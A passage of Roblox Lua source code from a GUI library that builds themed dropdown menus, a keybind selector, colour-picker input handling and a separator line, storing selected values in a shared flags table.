					dropdown.BlackOutlineItems.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 1, - 1)
					dropdown.BlackOutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutlineItems.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.IgnoreBackButtons = Instance.new(""TextButton"", dropdown.Main)
					dropdown.IgnoreBackButtons.BackgroundTransparency = 1
					dropdown.IgnoreBackButtons.BorderSizePixel = 0
					dropdown.IgnoreBackButtons.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.IgnoreBackButtons.Size = UDim2.new(0, 0, 0, 0)
					dropdown.IgnoreBackButtons.ZIndex = 7
					dropdown.IgnoreBackButtons.Text = """"
					dropdown.IgnoreBackButtons.Visible = false
					dropdown.IgnoreBackButtons.AutoButtonColor = false

					if dropdown.flag and dropdown.flag ~= """" then
						library.flags[dropdown.flag] = dropdown.multichoice and {dropdown.default or dropdown.defaultitems[1] or """"} or (dropdown.default or dropdown.defaultitems[1] or """")
					end

					function dropdown:isSelected(item)
						for i, v in pairs(dropdown.values) do
							if v == item then
								return true
							end
						end

						return false
					end

					function dropdown:updateText(text)
						if #text >= 27 then
							text = text:sub(1, 25) .. ""..""
						end
						dropdown.SelectedLabel.Text = text
					end

					dropdown.Changed = Instance.new(""BindableEvent"")
					function dropdown:Set(value)
						if type(value) == ""table"" then
							dropdown.values = value
							dropdown:updateText(table.concat(value, "", ""))
							pcall(dropdown.callback, value)
						else
							dropdown:updateText(value)
							dropdown.values = {value}
							pcall(dropdown.callback, value)
						end

						dropdown.Changed:Fire(value)
						if dropdown.flag and dropdown.flag ~= """" then
							library.flags[dropdown.flag] = dropdown.multichoice and dropdown.values or dropdown.values[1]
						end
					end

					function dropdown:Get()
						return dropdown.multichoice and dropdown.values or dropdown.values[1]
					end

					dropdown.items = {}
					function dropdown:Add(v)
						local Item = Instance.new(""TextButton"", dropdown.ItemsFrame)
						Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
						Item.TextColor3 = Color3.fromRGB(255, 255, 255)
						Item.BorderSizePixel = 0
						Item.Position = UDim2.fromOffset(0, 0)
						Item.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset - 4, 20)
						Item.ZIndex = 9
						Item.Text = v
						Item.Name = v
						Item.AutoButtonColor = false
						Item.Font = window.theme.font
						Item.TextSize = 15
						Item.TextXAlignment = Enum.TextXAlignment.Left
						Item.TextStrokeTransparency = 1
						dropdown.ItemsFrame.CanvasSize = dropdown.ItemsFrame.CanvasSize + UDim2.fromOffset(0, Item.AbsoluteSize.Y)

						Item.MouseButton1Down:Connect(function()
							if dropdown.multichoice then
								if dropdown:isSelected(v) then
									for i2, v2 in pairs(dropdown.values) do
										if v2 == v then
											table.remove(dropdown.values, i2)
										end
									end
									dropdown:Set(dropdown.values)
								else
									table.insert(dropdown.values, v)
									dropdown:Set(dropdown.values)
								end

								return
							else
								dropdown.Nav.Rotation = 90
								dropdown.ItemsFrame.Visible = false
								dropdown.ItemsFrame.Active = false
								dropdown.OutlineItems.Visible = false
								dropdown.BlackOutlineItems.Visible = false
								dropdown.BlackOutline2Items.Visible = false
								dropdown.IgnoreBackButtons.Visible = false
								dropdown.IgnoreBackButtons.Active = false
							end

							dropdown:Set(v)

							return
						end)

						runservice.RenderStepped:Connect(function()
							if dropdown.multichoice and dropdown:isSelected(v) or dropdown.values[1] == v then
								Item.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
								Item.TextColor3 = window.theme.accentcolor
								Item.Text = "" "" .. v
							else
								Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
								Item.TextColor3 = Color3.fromRGB(255, 255, 255)
								Item.Text = v
							end
						end)

						table.insert(dropdown.items, v)
						dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * Item.AbsoluteSize.Y, 20, 156) + 4)
						dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * Item.AbsoluteSize.Y) + 4)

						dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
						dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
						dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
						dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size
					end

					function dropdown:Remove(value)
						local item = dropdown.ItemsFrame:FindFirstChild(value)
						if item then
							for i, v in pairs(dropdown.items) do
								if v == value then
									table.remove(dropdown.items, i)
								end
							end

							dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * item.AbsoluteSize.Y, 20, 156) + 4)
							dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * item.AbsoluteSize.Y) + 4)

							dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
							dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
							dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
							dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size

							item:Remove()
						end
					end

					for i, v in pairs(dropdown.defaultitems) do
						dropdown:Add(v)
					end

					if dropdown.default then
						dropdown:Set(dropdown.default)
					end

					local MouseButton1Down = function()
						if dropdown.Nav.Rotation == 90 then
							dropdown.ItemsFrame.ScrollingEnabled = true
							sector.Main.Parent.ScrollingEnabled = false
							tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = - 90}):Play()
							dropdown.ItemsFrame.Visible = true
							dropdown.ItemsFrame.Active = true
							dropdown.IgnoreBackButtons.Visible = true
							dropdown.IgnoreBackButtons.Active = true
							dropdown.OutlineItems.Visible = true
							dropdown.BlackOutlineItems.Visible = true
							dropdown.BlackOutline2Items.Visible = true
						else
							dropdown.ItemsFrame.ScrollingEnabled = false
							sector.Main.Parent.ScrollingEnabled = true
							tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = 90}):Play()
							dropdown.ItemsFrame.Visible = false
							dropdown.ItemsFrame.Active = false
							dropdown.IgnoreBackButtons.Visible = false
							dropdown.IgnoreBackButtons.Active = false
							dropdown.OutlineItems.Visible = false
							dropdown.BlackOutlineItems.Visible = false
							dropdown.BlackOutline2Items.Visible = false
						end
					end

					dropdown.Main.MouseButton1Down:Connect(MouseButton1Down)
					dropdown.Nav.MouseButton1Down:Connect(MouseButton1Down)

					dropdown.BlackOutline2.MouseEnter:Connect(function()
						dropdown.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)
					dropdown.BlackOutline2.MouseLeave:Connect(function()
						dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end)

					sector:FixSize()
					table.insert(library.items, dropdown)

					return dropdown
				end

				local dragging_selector = false
				local dragging_hue = false

				colorpicker.selector.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging_selector = true
						colorpicker:RefreshSelector()
					end
				end)

				colorpicker.selector.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging_selector = false
						colorpicker:RefreshSelector()
					end
				end)

				colorpicker.hue.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging_hue = true
						colorpicker:RefreshHue()
					end
				end)

				colorpicker.hue.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging_hue = false
						colorpicker:RefreshHue()
					end
				end)

				uis.InputChanged:Connect(function(input)
					if dragging_selector and input.UserInputType == Enum.UserInputType.MouseMovement then
						colorpicker:RefreshSelector()
					end
					if dragging_hue and input.UserInputType == Enum.UserInputType.MouseMovement then
						colorpicker:RefreshHue()
					end
				end)

				local inputBegan = function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						for i, v in pairs(window.OpenedColorPickers) do
							if v and i ~= colorpicker.MainPicker then
								i.Visible = false
								window.OpenedColorPickers[i] = false
							end
						end

						colorpicker.MainPicker.Visible = not colorpicker.MainPicker.Visible
						window.OpenedColorPickers[colorpicker.MainPicker] = colorpicker.MainPicker.Visible
						if window.OpenedColorPickers[colorpicker.MainPicker] then
							colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
						else
							colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
						end
					end
				end

				colorpicker.Main.InputBegan:Connect(inputBegan)
				colorpicker.Outline.InputBegan:Connect(inputBegan)
				colorpicker.BlackOutline2.InputBegan:Connect(inputBegan)

				sector:FixSize()
				table.insert(library.items, colorpicker)

				return colorpicker
			end

			function sector:AddKeybind(text, default, newkeycallback, callback, flag)
				local keybind = {}

				keybind.text = text or """"
				keybind.default = default or ""None""
				keybind.callback = callback or function() end
				keybind.newkeycallback = newkeycallback or function(key) end
				keybind.flag = flag or text or """"

				keybind.value = keybind.default

				keybind.Main = Instance.new(""TextLabel"", sector.Items)
				keybind.Main.BackgroundTransparency = 1
				keybind.Main.Size = UDim2.fromOffset(156, 10)
				keybind.Main.ZIndex = 4
				keybind.Main.Font = window.theme.font
				keybind.Main.Text = keybind.text
				keybind.Main.TextColor3 = window.theme.itemscolor
				keybind.Main.TextSize = 15
				keybind.Main.TextStrokeTransparency = 1
				keybind.Main.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					keybind.Main.Font = theme.font
					keybind.Main.TextColor3 = theme.itemscolor
				end)

				keybind.Bind = Instance.new(""TextButton"", keybind.Main)
				keybind.Bind.Name = ""keybind""
				keybind.Bind.BackgroundTransparency = 1
				keybind.Bind.BorderColor3 = window.theme.outlinecolor
				keybind.Bind.ZIndex = 5
				keybind.Bind.BorderSizePixel = 0
				keybind.Bind.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 10, 0)
				keybind.Bind.Font = window.theme.font
				keybind.Bind.TextColor3 = Color3.fromRGB(136, 136, 136)
				keybind.Bind.TextSize = 15
				keybind.Bind.TextXAlignment = Enum.TextXAlignment.Right
				keybind.Bind.MouseButton1Down:Connect(function()
					keybind.Bind.Text = ""[...]""
					keybind.Bind.TextColor3 = window.theme.accentcolor
				end)
				updateevent.Event:Connect(function(theme)
					keybind.Bind.BorderColor3 = theme.outlinecolor
					keybind.Bind.Font = theme.font
				end)

				if keybind.flag and keybind.flag ~= """" then
					library.flags[keybind.flag] = keybind.default
				end

				local shorter_keycodes = {
					[""LeftShift""] = ""LSHIFT"", 
					[""RightShift""] = ""RSHIFT"", 
					[""LeftControl""] = ""LCTRL"", 
					[""RightControl""] = ""RCTRL"", 
					[""LeftAlt""] = ""LALT"", 
					[""RightAlt""] = ""RALT""
				}

				function keybind:Set(value)
					if value == ""None"" then
						keybind.value = value
						keybind.Bind.Text = ""["" .. value .. ""]""

						local size = textservice:GetTextSize(keybind.Bind.Text, keybind.Bind.TextSize, keybind.Bind.Font, Vector2.new(2000, 2000))
						keybind.Bind.Size = UDim2.fromOffset(size.X, size.Y)
						keybind.Bind.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 10 - keybind.Bind.AbsoluteSize.X, 0)
						if keybind.flag and keybind.flag ~= """" then
							library.flags[keybind.flag] = value
						end
						pcall(keybind.newkeycallback, value)
					end

					keybind.value = value
					keybind.Bind.Text = ""["" .. (shorter_keycodes[value.Name or value] or (value.Name or value)) .. ""]""

					local size = textservice:GetTextSize(keybind.Bind.Text, keybind.Bind.TextSize, keybind.Bind.Font, Vector2.new(2000, 2000))
					keybind.Bind.Size = UDim2.fromOffset(size.X, size.Y)
					keybind.Bind.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 10 - keybind.Bind.AbsoluteSize.X, 0)
					if keybind.flag and keybind.flag ~= """" then
						library.flags[keybind.flag] = value
					end
					pcall(keybind.newkeycallback, value)
				end
				keybind:Set(keybind.default and keybind.default or ""None"")

				function keybind:Get()
					return keybind.value
				end

				uis.InputBegan:Connect(function(input, gameProcessed)
					if not gameProcessed then
						if keybind.Bind.Text == ""[...]"" then
							keybind.Bind.TextColor3 = Color3.fromRGB(136, 136, 136)
							if input.UserInputType == Enum.UserInputType.Keyboard then
								keybind:Set(input.KeyCode)
							else
								keybind:Set(""None"")
							end
						else
							if keybind.value ~= ""None"" and input.KeyCode == keybind.value then
								pcall(keybind.callback)
							end
						end
					end
				end)

				sector:FixSize()
				table.insert(library.items, keybind)

				return keybind
			end

			function sector:AddDropdown(text, items, default, multichoice, callback, flag)
				local dropdown = {}

				dropdown.text = text or """"
				dropdown.defaultitems = items or {}
				dropdown.default = default
				dropdown.callback = callback or function() end
				dropdown.multichoice = multichoice or false
				dropdown.values = {}
				dropdown.flag = flag or text or """"

				dropdown.MainBack = Instance.new(""Frame"", sector.Items)
				dropdown.MainBack.Name = ""backlabel""
				dropdown.MainBack.ZIndex = 7
				dropdown.MainBack.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 34)
				dropdown.MainBack.BorderSizePixel = 0
				dropdown.MainBack.BackgroundTransparency = 1

				dropdown.Label = Instance.new(""TextLabel"", dropdown.MainBack)
				dropdown.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				dropdown.Label.BackgroundTransparency = 1
				dropdown.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 10)
				dropdown.Label.Position = UDim2.fromOffset(0, 0)
				dropdown.Label.Font = window.theme.font
				dropdown.Label.Text = dropdown.text
				dropdown.Label.ZIndex = 4
				dropdown.Label.TextColor3 = window.theme.itemscolor
				dropdown.Label.TextSize = 15
				dropdown.Label.TextStrokeTransparency = 1
				dropdown.Label.TextXAlignment = Enum.TextXAlignment.Left

				updateevent.Event:Connect(function(theme)
					dropdown.Label.Font = theme.font
					dropdown.Label.TextColor3 = theme.itemscolor
				end)

				dropdown.Main = Instance.new(""TextButton"", dropdown.MainBack)
				dropdown.Main.Name = ""dropdown""
				dropdown.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				dropdown.Main.BorderSizePixel = 0
				dropdown.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 16)
				dropdown.Main.Position = UDim2.fromOffset(0, 17)
				dropdown.Main.ZIndex = 5
				dropdown.Main.AutoButtonColor = false
				dropdown.Main.Font = window.theme.font
				dropdown.Main.Text = """"
				dropdown.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
				dropdown.Main.TextSize = 15
				dropdown.Main.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					dropdown.Main.Font = theme.font
				end)

				dropdown.Gradient = Instance.new(""UIGradient"", dropdown.Main)
				dropdown.Gradient.Rotation = 90
				dropdown.Gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))}

				dropdown.SelectedLabel = Instance.new(""TextLabel"", dropdown.Main)
				dropdown.SelectedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				dropdown.SelectedLabel.BackgroundTransparency = 1
				dropdown.SelectedLabel.Position = UDim2.fromOffset(5, 2)
				dropdown.SelectedLabel.Size = UDim2.fromOffset(130, 13)
				dropdown.SelectedLabel.Font = window.theme.font
				dropdown.SelectedLabel.Text = dropdown.text
				dropdown.SelectedLabel.ZIndex = 5
				dropdown.SelectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				dropdown.SelectedLabel.TextSize = 15
				dropdown.SelectedLabel.TextStrokeTransparency = 1
				dropdown.SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					dropdown.SelectedLabel.Font = theme.font
				end)

				dropdown.Nav = Instance.new(""ImageButton"", dropdown.Main)
				dropdown.Nav.Name = ""navigation""
				dropdown.Nav.BackgroundTransparency = 1
				dropdown.Nav.LayoutOrder = 10
				dropdown.Nav.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 5)
				dropdown.Nav.Rotation = 90
				dropdown.Nav.ZIndex = 5
				dropdown.Nav.Size = UDim2.fromOffset(8, 8)
				dropdown.Nav.Image = ""rbxassetid://4918373417""
				dropdown.Nav.ImageColor3 = Color3.fromRGB(210, 210, 210)

				dropdown.BlackOutline2 = Instance.new(""Frame"", dropdown.Main)
				dropdown.BlackOutline2.Name = ""blackline""
				dropdown.BlackOutline2.ZIndex = 4
				dropdown.BlackOutline2.Size = dropdown.Main.Size + UDim2.fromOffset(6, 6)
				dropdown.BlackOutline2.BorderSizePixel = 0
				dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				dropdown.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					dropdown.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				dropdown.Outline = Instance.new(""Frame"", dropdown.Main)
				dropdown.Outline.Name = ""blackline""
				dropdown.Outline.ZIndex = 4
				dropdown.Outline.Size = dropdown.Main.Size + UDim2.fromOffset(4, 4)
				dropdown.Outline.BorderSizePixel = 0
				dropdown.Outline.BackgroundColor3 = window.theme.outlinecolor
				dropdown.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					dropdown.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				dropdown.BlackOutline = Instance.new(""Frame"", dropdown.Main)
				dropdown.BlackOutline.Name = ""blackline""
				dropdown.BlackOutline.ZIndex = 4
				dropdown.BlackOutline.Size = dropdown.Main.Size + UDim2.fromOffset(2, 2)
				dropdown.BlackOutline.BorderSizePixel = 0
				dropdown.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				dropdown.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					dropdown.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				dropdown.ItemsFrame = Instance.new(""ScrollingFrame"", dropdown.Main)
				dropdown.ItemsFrame.Name = ""itemsframe""
				dropdown.ItemsFrame.BorderSizePixel = 0
				dropdown.ItemsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
				dropdown.ItemsFrame.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
				dropdown.ItemsFrame.ScrollBarThickness = 2
				dropdown.ItemsFrame.ZIndex = 8
				dropdown.ItemsFrame.ScrollingDirection = ""Y""
				dropdown.ItemsFrame.Visible = false
				dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.Main.AbsoluteSize.X, 0)

				dropdown.ListLayout = Instance.new(""UIListLayout"", dropdown.ItemsFrame)
				dropdown.ListLayout.FillDirection = Enum.FillDirection.Vertical
				dropdown.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

				dropdown.ListPadding = Instance.new(""UIPadding"", dropdown.ItemsFrame)
				dropdown.ListPadding.PaddingTop = UDim.new(0, 2)
				dropdown.ListPadding.PaddingBottom = UDim.new(0, 2)
				dropdown.ListPadding.PaddingLeft = UDim.new(0, 2)
				dropdown.ListPadding.PaddingRight = UDim.new(0, 2)

				dropdown.BlackOutline2Items = Instance.new(""Frame"", dropdown.Main)
				dropdown.BlackOutline2Items.Name = ""blackline""
				dropdown.BlackOutline2Items.ZIndex = 7
				dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
				dropdown.BlackOutline2Items.BorderSizePixel = 0
				dropdown.BlackOutline2Items.BackgroundColor3 = window.theme.outlinecolor2
				dropdown.BlackOutline2Items.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 3, - 3)
				dropdown.BlackOutline2Items.Visible = false
				updateevent.Event:Connect(function(theme)
					dropdown.BlackOutline2Items.BackgroundColor3 = theme.outlinecolor2
				end)

				dropdown.OutlineItems = Instance.new(""Frame"", dropdown.Main)
				dropdown.OutlineItems.Name = ""blackline""
				dropdown.OutlineItems.ZIndex = 7
				dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
				dropdown.OutlineItems.BorderSizePixel = 0
				dropdown.OutlineItems.BackgroundColor3 = window.theme.outlinecolor
				dropdown.OutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 2, - 2)
				dropdown.OutlineItems.Visible = false
				updateevent.Event:Connect(function(theme)
					dropdown.OutlineItems.BackgroundColor3 = theme.outlinecolor
				end)

				dropdown.BlackOutlineItems = Instance.new(""Frame"", dropdown.Main)
				dropdown.BlackOutlineItems.Name = ""blackline""
				dropdown.BlackOutlineItems.ZIndex = 7
				dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(- 2, - 2)
				dropdown.BlackOutlineItems.BorderSizePixel = 0
				dropdown.BlackOutlineItems.BackgroundColor3 = window.theme.outlinecolor2
				dropdown.BlackOutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 1, - 1)
				dropdown.BlackOutlineItems.Visible = false
				updateevent.Event:Connect(function(theme)
					dropdown.BlackOutlineItems.BackgroundColor3 = theme.outlinecolor2
				end)

				dropdown.IgnoreBackButtons = Instance.new(""TextButton"", dropdown.Main)
				dropdown.IgnoreBackButtons.BackgroundTransparency = 1
				dropdown.IgnoreBackButtons.BorderSizePixel = 0
				dropdown.IgnoreBackButtons.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
				dropdown.IgnoreBackButtons.Size = UDim2.new(0, 0, 0, 0)
				dropdown.IgnoreBackButtons.ZIndex = 7
				dropdown.IgnoreBackButtons.Text = """"
				dropdown.IgnoreBackButtons.Visible = false
				dropdown.IgnoreBackButtons.AutoButtonColor = false

				if dropdown.flag and dropdown.flag ~= """" then
					library.flags[dropdown.flag] = dropdown.multichoice and {dropdown.default or dropdown.defaultitems[1] or """"} or (dropdown.default or dropdown.defaultitems[1] or """")
				end

				function dropdown:isSelected(item)
					for i, v in pairs(dropdown.values) do
						if v == item then
							return true
						end
					end

					return false
				end

				function dropdown:GetOptions()
					return dropdown.values
				end

				function dropdown:updateText(text)
					if #text >= 27 then
						text = text:sub(1, 25) .. ""..""
					end
					dropdown.SelectedLabel.Text = text
				end

				dropdown.Changed = Instance.new(""BindableEvent"")
				function dropdown:Set(value)
					if type(value) == ""table"" then
						dropdown.values = value
						dropdown:updateText(table.concat(value, "", ""))
						pcall(dropdown.callback, value)
					else
						dropdown:updateText(value)
						dropdown.values = {value}
						pcall(dropdown.callback, value)
					end

					dropdown.Changed:Fire(value)
					if dropdown.flag and dropdown.flag ~= """" then
						library.flags[dropdown.flag] = dropdown.multichoice and dropdown.values or dropdown.values[1]
					end
				end

				function dropdown:Get()
					return dropdown.multichoice and dropdown.values or dropdown.values[1]
				end

				dropdown.items = {}
				function dropdown:Add(v)
					local Item = Instance.new(""TextButton"", dropdown.ItemsFrame)
					Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					Item.TextColor3 = Color3.fromRGB(255, 255, 255)
					Item.BorderSizePixel = 0
					Item.Position = UDim2.fromOffset(0, 0)
					Item.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset - 4, 20)
					Item.ZIndex = 9
					Item.Text = v
					Item.Name = v
					Item.AutoButtonColor = false
					Item.Font = window.theme.font
					Item.TextSize = 15
					Item.TextXAlignment = Enum.TextXAlignment.Left
					Item.TextStrokeTransparency = 1
					dropdown.ItemsFrame.CanvasSize = dropdown.ItemsFrame.CanvasSize + UDim2.fromOffset(0, Item.AbsoluteSize.Y)

					Item.MouseButton1Down:Connect(function()
						if dropdown.multichoice then
							if dropdown:isSelected(v) then
								for i2, v2 in pairs(dropdown.values) do
									if v2 == v then
										table.remove(dropdown.values, i2)
									end
								end
								dropdown:Set(dropdown.values)
							else
								table.insert(dropdown.values, v)
								dropdown:Set(dropdown.values)
							end

							return
						else
							dropdown.Nav.Rotation = 90
							dropdown.ItemsFrame.Visible = false
							dropdown.ItemsFrame.Active = false
							dropdown.OutlineItems.Visible = false
							dropdown.BlackOutlineItems.Visible = false
							dropdown.BlackOutline2Items.Visible = false
							dropdown.IgnoreBackButtons.Visible = false
							dropdown.IgnoreBackButtons.Active = false
						end

						dropdown:Set(v)

						return
					end)

					runservice.RenderStepped:Connect(function()
						if dropdown.multichoice and dropdown:isSelected(v) or dropdown.values[1] == v then
							Item.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
							Item.TextColor3 = window.theme.accentcolor
							Item.Text = "" "" .. v
						else
							Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
							Item.TextColor3 = Color3.fromRGB(255, 255, 255)
							Item.Text = v
						end
					end)

					table.insert(dropdown.items, v)
					dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * Item.AbsoluteSize.Y, 20, 156) + 4)
					dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * Item.AbsoluteSize.Y) + 4)

					dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
					dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
					dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
					dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size
				end

				function dropdown:Remove(value)
					local item = dropdown.ItemsFrame:FindFirstChild(value)
					if item then
						for i, v in pairs(dropdown.items) do
							if v == value then
								table.remove(dropdown.items, i)
							end
						end

						dropdown.ItemsFrame.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset, math.clamp(#dropdown.items * item.AbsoluteSize.Y, 20, 156) + 4)
						dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.ItemsFrame.AbsoluteSize.X, (#dropdown.items * item.AbsoluteSize.Y) + 4)

						dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(2, 2)
						dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
						dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
						dropdown.IgnoreBackButtons.Size = dropdown.ItemsFrame.Size

						item:Remove()
					end
				end

				for i, v in pairs(dropdown.defaultitems) do
					dropdown:Add(v)
				end

				if dropdown.default then
					dropdown:Set(dropdown.default)
				end

				local MouseButton1Down = function()
					if dropdown.Nav.Rotation == 90 then
						tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = - 90}):Play()
						if dropdown.items and #dropdown.items ~= 0 then
							dropdown.ItemsFrame.ScrollingEnabled = true
							sector.Main.Parent.ScrollingEnabled = false
							dropdown.ItemsFrame.Visible = true
							dropdown.ItemsFrame.Active = true
							dropdown.IgnoreBackButtons.Visible = true
							dropdown.IgnoreBackButtons.Active = true
							dropdown.OutlineItems.Visible = true
							dropdown.BlackOutlineItems.Visible = true
							dropdown.BlackOutline2Items.Visible = true
						end
					else
						tweenservice:Create(dropdown.Nav, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {Rotation = 90}):Play()
						dropdown.ItemsFrame.ScrollingEnabled = false
						sector.Main.Parent.ScrollingEnabled = true
						dropdown.ItemsFrame.Visible = false
						dropdown.ItemsFrame.Active = false
						dropdown.IgnoreBackButtons.Visible = false
						dropdown.IgnoreBackButtons.Active = false
						dropdown.OutlineItems.Visible = false
						dropdown.BlackOutlineItems.Visible = false
						dropdown.BlackOutline2Items.Visible = false
					end
				end

				dropdown.Main.MouseButton1Down:Connect(MouseButton1Down)
				dropdown.Nav.MouseButton1Down:Connect(MouseButton1Down)

				dropdown.BlackOutline2.MouseEnter:Connect(function()
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				dropdown.BlackOutline2.MouseLeave:Connect(function()
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				sector:FixSize()
				table.insert(library.items, dropdown)

				return dropdown
			end

			function sector:AddSeperator(text)
				local seperator = {}
				seperator.text = text or """"

				seperator.main = Instance.new(""Frame"", sector.Items)
				seperator.main.Name = ""Main""
				seperator.main.ZIndex = 5
				seperator.main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 10)
				seperator.main.BorderSizePixel = 0
				seperator.main.BackgroundTransparency = 1

				seperator.line = Instance.new(""Frame"", seperator.main)
				seperator.line.Name = ""Line""
				seperator.line.ZIndex = 7
				seperator.line.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
				seperator.line.BorderSizePixel = 0
				seperator.line.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 1)
				seperator.line.Position = UDim2.fromOffset(7, 5)

				seperator.outline = Instance.new(""Frame"", seperator.line)
				seperator.outline.Name = ""Outline""
				seperator.outline.ZIndex = 6
				seperator.outline.BorderSizePixel = 0
				seperator.outline.BackgroundColor3 = window.theme.outlinecolor2
				seperator.outline.Position = UDim2.fromOffset(- 1, - 1)
				seperator.outline.Size = seperator.line.Size - UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					seperator.outline.BackgroundColor3 = theme.outlinecolor2
				end)

